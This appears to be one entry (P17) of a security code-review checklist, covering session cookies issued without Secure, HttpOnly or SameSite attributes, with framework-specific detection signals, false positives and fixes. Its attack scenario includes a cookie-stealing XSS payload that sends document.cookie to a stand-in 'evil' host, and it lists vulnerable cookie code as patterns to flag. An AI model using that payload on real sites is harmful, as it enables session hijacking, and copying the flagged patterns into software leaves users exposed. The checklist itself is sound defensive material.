---
id: P17
name: SessionCookieAttributes
refs: ASVS V3.4.1, V3.4.2, V3.4.3, V3.4.4 / WSTG-SESS-02 / CS: Session Management, Cookie Security
requires: [backend]
---

# P17 — Session Cookie Attributes

## Overview
Session and authentication cookies are the bearer tokens of the web: whoever possesses them is the user. When such a cookie is issued without the `Secure`, `HttpOnly`, and `SameSite` attributes — or with an overly broad `Domain`/`Path` — it becomes exposed to network interception, cross-site request forgery (CSRF), session hijacking via XSS, and leakage to sibling applications on the same origin. The root cause is almost always a developer relying on framework defaults that are weaker than the threat model requires, or constructing the `Set-Cookie` header by hand and omitting attributes. Browser defaults (`SameSite=Lax`) mitigate some cases but are inconsistent across browsers and versions, so the attributes must be set explicitly per ASVS V3.4.

## What to check
- Does every session/authentication token cookie set `Secure` (so it is only ever transmitted over HTTPS)?
- Does it set `HttpOnly` so the value is inaccessible to `document.cookie` (defeating XSS-based token theft)?
- Does it set `SameSite` to `Strict` or `Lax`? `SameSite=None` requires `Secure` and must be justified by a legitimate cross-site use case (embedded widgets, SSO redirects).
- Is `SameSite` omitted entirely? Some older browsers treat a missing attribute as `None`; never rely on the default.
- Is the `Domain` scoped too broadly (e.g. `Domain=.example.com` shares the cookie with every subdomain, including untrusted/marketing subdomains)?
- Is the `Path` set to `/` when the cookie could be confined to `/app` or `/admin`, causing leakage to other applications on the same host?
- Are `Expires`/`Max-Age` set so the cookie does not outlive its usefulness (and session cookies have no absurd lifetime)?
- Is the `__Host-` prefix used for host-only session cookies (a strong defense-in-depth measure pinning `Secure`, `Path=/`, and no `Domain`)?
- Are tokens ever placed in non-`HttpOnly` cookies so frontend JS can read them? If so, confirm they are short-lived opaque tokens, not the long-lived session credential.
- For hand-rolled `Set-Cookie` string building: confirm every attribute is present and correctly cased (`HttpOnly`, `SameSite`, `Secure` — browsers are case-insensitive but typos like `httpOnly:` inside a raw string are silently ignored).

## Static signals
Framework cookie helpers with missing/insecure attributes:
- Node/Express: `res.cookie('sid', token)` with no options object — or `res.cookie('sid', token, { secure: false })`, `{ httpOnly: false }`, `{ sameSite: 'none' }` without `secure: true`.
- Express-session: `app.use(session({ cookie: { /* no secure/httpOnly/sameSite */ } }))`; `cookie: { secure: false }` (note: `secure` must be `true` in prod, often behind `app.set('trust proxy', 1)`).
- Koa: `ctx.cookies.set('sid', token)` without `{ httpOnly: true, secure: true, sameSite: 'lax' }`.
- Python/Django: `SESSION_COOKIE_SECURE = False`, `SESSION_COOKIE_HTTPONLY = False`, `CSRF_COOKIE_SECURE = False`, or a custom `response.set_cookie('sid', v, secure=False, httponly=False)`.
- Python/Flask: `app.config.update(SESSION_COOKIE_SECURE=False, SESSION_COOKIE_HTTPONLY=False, SESSION_COOKIE_SAMESITE=None)`.
- Java/Spring: `server.servlet.session.cookie.secure=false`, `http-only=false`; `Cookie` objects set via `new Cookie("sid", token)` then `cookie.setSecure(false)` / `cookie.setHttpOnly(false)`.
- Go: `http.Cookie{Secure: false, HttpOnly: false}` or a cookie struct with no `SameSite` field set; using `http.SetCookie` with a literal string built via `fmt.Sprintf`.
- PHP: `setcookie('sid', $token)` (no options), `setrawcookie(...)`; `session_set_cookie_params(['httponly' => false, 'secure' => false, 'samesite' => 'None'])` without `secure=>true`; `session.cookie_secure = 0` / `session.cookie_httponly = 0` in php.ini.
- Ruby/Rails: `config.force_ssl = false` combined with `cookies[:sid] = { value: token }` (no `secure`/`httponly`/`same_site`); `Rails.application.config.action_dispatch.cookies_same_site_protection = nil`.

Hand-rolled `Set-Cookie` headers (highest risk — attributes easily dropped):
- `res.setHeader('Set-Cookie', \`sid=${token}; Path=/\`)` — no `Secure`/`HttpOnly`/`SameSite`.
- Python: `response['Set-Cookie'] = f'sid={token}; Path=/'`.
- Java: `response.addHeader('Set-Cookie', "sid=" + token)`.

Overly broad scoping:
- `domain: '.example.com'` or `Domain=.example.com` (shares across all subdomains).
- `path: '/'` when the app lives under `/app` or `/admin`.
- Cookie name without `__Host-` or `__Secure-` prefix where a sensitive credential is involved.

## False positives
- Legitimate cross-site use (embedded third-party widget, SSO/initiated federation, payment redirect) requires `SameSite=None; Secure` — this is correct by design. Verify the partner context and that `Secure` is actually present. Treat as Medium, not High.
- A framework default that is already secure (Django sets `SESSION_COOKIE_HTTPONLY=True`, `CSRF_COOKIE_HTTPONLY=True` by default; Express-session sets `httpOnly: true` by default). Confirm the default was not overridden and the runtime version enforces it.
- `Secure` cookie that appears unused over plain HTTP in local dev (`NODE_ENV !== 'production'`) — verify the production config separately; do not close solely on dev settings.
- A cookie used purely for non-sensitive UI state (theme, locale) and explicitly non-`HttpOnly` so client JS can read it — low impact; flag only if its name/prefix collides with session storage.
- CSRF double-submit token cookies intentionally lack `HttpOnly` (the frontend must read them); they must still be `Secure` and `SameSite=Lax/Strict`.

## Attack scenario
1. A site issues its session cookie as `Set-Cookie: sid=abc123; Path=/` (no `Secure`, no `HttpOnly`, no `SameSite`).
2. Attacker gets the victim onto a hostile network or performs SSL-strip / MITM on a mixed HTTP page; because `Secure` is absent, the browser transmits `sid` over plaintext HTTP and the attacker captures it.
3. Alternatively, the attacker injects a payload (`<script>fetch('//evil/?c='+document.cookie)</script>`) via a reflected/stored XSS; because `HttpOnly` is absent, `document.cookie` returns `sid=abc123`.
4. Alternatively, the attacker lures the victim to `evil.com` with a hidden form auto-POSTing to `app.example.com/transfer`; because `SameSite` is absent, the browser attaches the `sid` cookie and the state-changing request succeeds (CSRF).
5. With the captured `sid`, the attacker fully impersonates the victim from their own machine — account takeover.

## Impact
- **Confidentiality**: stolen session credential → full account impersonation and data disclosure.
- **Integrity**: CSRF forces authenticated state-changing actions (transfers, email/password changes, privilege escalation) without consent.
- **Availability**: an attacker who hijacks the session can lock the user out (change credentials, delete the account).
- Severity scales with the privilege level of the compromised account and the breadth of the `Domain`/`Path` (a domain-wide session cookie leaked to a vulnerable subdomain escalates blast radius dramatically). Missing `Secure` over untrusted networks and missing `HttpOnly` paired with an XSS are typically High; missing `SameSite` alone is High for state-changing endpoints, Medium otherwise.

## Remediation
Set every attribute explicitly via the framework helper; never build `Set-Cookie` by hand:
```ts
// VULNERABLE — bare cookie, attributes missing
res.cookie('sid', token);

// SAFE — all attributes set, host-scoped via __Host- prefix
res.cookie('__Host-sid', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict', // or 'lax' for top-level navigation flows
  path: '/',
  maxAge: 1000 * 60 * 30, // 30 min, rotates on activity
});
```
```python
# Django settings.py
SESSION_COOKIE_SECURE = True
SESSION_COOKIE_HTTPONLY = True
SESSION_COOKIE_SAMESITE = 'Lax'   # or 'Strict'
CSRF_COOKIE_SECURE = True
CSRF_COOKIE_SAMESITE = 'Lax'
SECURE_PROXY_SSL_HEADER = ('HTTP_X_FORWARDED_PROTO', 'https')  # so `secure` cookies are sent
```
As defense-in-depth, prefer the `__Host-` prefix for host-only session cookies (forces `Secure`, `Path=/`, and forbids `Domain`), enable HSTS so the browser never speaks HTTP to the host, and pair `SameSite` with a synchronizer-token CSRF defense rather than relying on `SameSite` alone.

## References
- OWASP ASVS V3.4.1–V3.4.4 — Cookie-based session management attributes (`Secure`, `HttpOnly`, `SameSite`, prefix)
- OWASP WSTG-SESS-02 — Testing for Cookies Attributes
- OWASP Cheat Sheets: Session Management, Cookie Security, Cross-Site Request Forgery Prevention
